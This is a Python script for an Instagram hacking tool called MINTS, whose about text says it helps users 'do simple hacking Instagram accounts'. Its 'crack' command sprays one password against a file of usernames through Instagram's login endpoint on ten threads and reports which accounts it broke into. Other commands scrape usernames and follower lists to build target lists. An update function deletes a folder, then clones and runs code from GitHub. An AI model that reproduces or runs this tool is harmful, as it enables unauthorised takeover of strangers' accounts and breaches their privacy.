import requests,json,re,os
from http.cookiejar import LWPCookieJar as cj
from bs4 import BeautifulSoup as bs
import threading

l0 = '\033[0m'
l1 = '\033[91m'
l2 = '\033[92m'
l3 = '\033[93m'
l4 = '\033[94m'
l5 = '\033[95m'
l6 = '\033[96m'





def login():
	id = input(f'{l6}Email/username:{l0} ')
	pw = input(f'{l6}Password:{l0} ')
	ig = 'https://www.instagram.com'
	log_ig = ig+'/accounts/login/ajax/'
	headers={'User-Agent':'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'}
	
	s = requests.Session()
	s.cookies = cj('.kuki')
	s.headers = headers
	s.headers.update({'Referer':ig})
	
	r = s.get(ig)
	s.headers.update({'X-CSRFToken':r.cookies['csrftoken']})
	data = {'username':id,'password':pw}
	
	login = s.post(log_ig,data=data,allow_redirects=True)
	s.headers.update({'X-CSRFToken':login.cookies['csrftoken']})
	j = json.loads(login.text)
	if 'fr' in j:
		print(f'{l5}Login success. ')
		s.cookies.save()
	elif 'two_factor_required' in j:
		print(f' {l5}Two factor Authentification\nTurn off it and try again')
	else:
		print(f'{l5}Login Failed')
succ=[]
tf =[]

def logbf(uname):
	ig = 'https://www.instagram.com'
	log_ig = ig+'/accounts/login/ajax/'
	headers={'User-Agent':'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'}
	
	s = requests.Session()
	s.cookies = cj('kuki')
	s.headers = headers
	s.headers.update({'Referer':ig})
	
	r = s.get(ig)
	s.headers.update({'X-CSRFToken':r.cookies['csrftoken']})
	data = {'username':uname,'password':pw}
	
	login = s.post(log_ig,data=data,allow_redirects=True)
	s.headers.update({'X-CSRFToken':login.cookies['csrftoken']})
	j = json.loads(login.text)
	if 'fr' in j:
		print(l3+uname+l2+' Success'+l0)
		succ.append(uname)
	elif 'two_factor_required' in j:
		print(l6+uname + l4+' Two factor Authentification')
		tf.append(uname)
	else:
		print(l6+uname+l1+ ' Failed'+l0)
	
def feed():
	try:
		open('.kuki')
	except:
		login()
	s = requests.Session()
	s.cookies = cj('.kuki')
	s.cookies.load()
	cek = s.get('https://www.instagram.com')
	b = bs(cek.text,'html.parser')
	for script in b.find_all('script'):
		if "window.__additionalDataLoaded(" in str(script):
			feed = re.findall(r"\'feed',(.*?)\);</script>",str(script))
			feed = feed[0]
			
			j = json.loads(feed)
			for i in j['user']['edge_web_feed_timeline']['edges']:
				j=i['node']['owner']
						
				id = j['id']
				name = j['full_name']
				uname = j['username']
					
				for txt in i['node']["edge_media_to_caption"]['edges']:
					capt = txt['node']['text']
				print(f'''
{l6}Name :{l5} {name} (@{uname})
{l6}ID   : {l5}{id}
{l6}Capt : {l0}{capt}
{l6}{"#"*40}\n''')

def search():
	name = input(f'{l6}Name :{l0} ')
	while len(name) == 0:
		print(f"{l1}Don't be empty")
		name = input(f'{l6}Name :{l0} ')
	nm=name.replace(' ','+')
	cek = requests.get('http://gopicta.com/?s='+nm)
	b = bs(cek.text,'html.parser')
	fname = "Results/"+name.replace(" ","_")+'.txt'
	id = open(fname,'w')
	n = 1
	for us in b.find_all('a',{"class":"name"}):
		i = us.get('href').replace('/','')
		id.write(i+'\n')
		print(f"{n}# {i}")
		n += 1
	print(f'Done. Saved as {fname}')
def folower():
	url = 'http://gopicta.com/%s/followers'
	usr = input(f'{l6}Username (without @) :{l0} ')
	us= usr.replace(' ','+')
	r = requests.get(url %us).text
	b = bs(r,'html.parser')

	fname = "Results/"+usr.replace(' ','_')+'.txt'
	id = open(fname,'w')
	n = 1
	for us in b.find_all('a',{"class":"name"}):
		i = us.get('href').replace('/','')
		id.write(i+'\n')
		print(f"{n}# {i}")
		n+=1
	print(f'Done. Saved as {fname}')
	
def bf():
	global pw
	id = []
	list = open(input(f'{l6}Uname file list :{l0} '),'r').readlines()
	print(f'{l5}{str(len(list))}{l0} uname successfully loaded.')
	pw = input(f'{l6}Password : {l0}')
	print(f'{l6}Cracking..\n')
	for i in list:
		id.append(i.strip())
	from multiprocessing.pool import ThreadPool as tp
	try:
		t = tp(10)
		p=t.map(logbf,id)
	except requests.exceptions.ConnectionError:
		print(l1+'Connection error')
	if len(succ) == 0 and len(tf) == 0:
		print(f'{l0}\nCracking {l6}{str(len(id))}{l0} uname done with null results.')
	else:
		print(f'''
	{l6}Results
	{l5}-------
	''')
		if len(succ) == 0:
			print(f'{l6}Two factor verification(s):')
			for i in tf:
				print(l5+'  * '+l0+i)
		elif len(tf) == 0:
			print(f'{l6}Success:')
			for i in succ:
				print(l5+'  * '+l0+i)
		else:
			print(f'{l6}Success:')
			for i in succ:
				print(l5+'  * '+l0+i)
			print(f'{l6}Two factor verification(s):')
			for i in tf:
				print(l5+'  * '+l0+i)
			
			
			
def update():
	import os
	import subprocess,time
	print (l6+'\nChecking the connection..')
	try:
		rq = requests.get('https://github.com')
		print(l6+'Connection OK')
		print (l6+"Updating the program..")
		print (l6+"This may take a few minutes, don't be cancel !\nPlease wait..")
		os.system('cd && rm -rf mints')
		subprocess.call(['cd && git clone https://github.com/karjok/mints'],shell=True, stdout=subprocess.DEVNULL, stderr = subprocess.STDOUT)
		print (l6+'Restarting the program..')
		time.sleep(2)
		os.system('cd ../mints && python mints.py') 
	except requests.exceptions.ConnectionError:
		print (l1+'Connection error detected !\nMINTS program need an internet connection.\nPlease check it before use this program.')
				
		
def ban():
	os.system('clear')
	print(f'''{l6}
    ╔══╗   ╔══╗╔═╗╔══╗   ╔═╗╔═══════╗╔══════╗
    ║  ╚╗ ╔╝  ║║ ║║  ╚╗  ║ ║╚══╗ ╔══╝║ ╔════╝
    ║ ╔╗╚═╝╔╗ ║║ ║║ ╔╗╚╗ ║ ║   ║ ║   ║ ╚════╗
    ║ ║╚╗ ╔╝║ ║║ ║║ ║╚╗╚╗║ ║   ║ ║   ╚════╗ ║
    ║ ║ ╚═╝ ║ ║║ ║║ ║ ╚╗╚╝ ║   ║ ║   ╔════╝ ║
    ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
     {l5}     Mini Instagram Tool Frameworks
 

''')
def menu():
	ban()
	inp =['help','uname','follow','crack','about','feed','login','update','exit']
	c = input(f'{l6}>> {l0}')
	while c not in inp:
		print(f'{l1} "{c}" command not found\n type "help" for more commands')
		c = input(f'{l6}>> {l0}')

	if c == 'uname':
		ban()
		search()
	elif c == 'follow':
		ban()
		folower()
	elif c == 'crack':
		ban()
		bf()
	elif c == 'help':
		print(f'''
{l6}Command		Information{l5}
-------		-----------{l0}
help		print this help
login		login to your account
uname		dump username by name
follow		dump username followers
crack		multibruteforce by uname list
feed		view your timeline feed
update		update this program
about		print this tool information
exit		exit

''')
	elif c == 'about':
		ban()
		print(l6+'Tool Informations'.center(50))
		print(l5+'-----------------'.center(50))
		print(f'''{l0}
Name   :  MINTS
Version:  V1.0 (Monday, April 8th, 2019 10:31 PM)
Author :  Karjok Pangesty (tn_kjx)
Team   :  CRABS ID (https://t.me/CRABS_ID)
Greets :  Allah SWT, Eka Pangesty, CRABS

Intro  :  MINTS (Mini Instagram Tool Frameworks)
	  is a tool that can help you
	  to do simple hacking Instagram accounts.
	  I hope this tool useful for you.
	  
Note   :  Author isn't responsible for any user abuse
	  if there are problems please report to the author.
	  FB : https://fb.me/karjok.pangesty.5
	  TG : https://t.me/om_karjok

''')
	elif c == 'feed':
		ban()
		feed()
		
	elif c == 'login':
		ban()
		login()
	elif c == 'update':
		ban()
		update()	
	else:
		exit()




if __name__=='__main__':
	try:
		os.mkdir("Results")
	except:
		pass
	menu()
